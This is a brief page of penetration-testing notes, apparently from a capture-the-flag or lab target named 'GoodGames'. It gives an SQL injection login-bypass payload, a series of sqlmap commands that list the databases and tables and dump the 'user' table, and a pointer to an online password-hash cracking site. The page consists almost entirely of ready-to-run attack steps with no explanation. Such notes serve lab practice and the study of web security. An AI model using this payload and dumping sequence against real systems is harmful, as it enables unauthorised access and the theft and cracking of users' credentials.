# SQL Injection

Payload

```sql
admin' or 1=1 -- -
```



Sqlmap saved request

```
sqlmap -r goodgames.req
sqlmap -r goodgames.req --dbs
sqlmap -r goodgames.req -D main --tables
sqlmap -r goodgames.req -D main -T user --dump

```



Password crack

{% embed url="https://crackstation.net" %}
